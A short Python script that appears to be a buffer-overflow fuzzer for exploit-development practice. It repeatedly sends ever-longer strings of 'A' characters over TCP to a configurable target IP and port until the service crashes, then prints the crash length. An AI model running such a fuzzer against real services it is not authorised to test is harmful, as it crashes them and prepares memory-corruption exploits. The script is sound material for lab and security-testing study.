#!/usr/bin/env python3
import socket, time, sys
ip = "127.0.0.1"   # Add The Target IP here
port =  5555  # Add the Target Port
timeout = 5 
prefix = ""   # Adjust According to the Input your application is taking in (othervise leave blank).
string = prefix + "A" * 100
while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing the Target with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("The Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
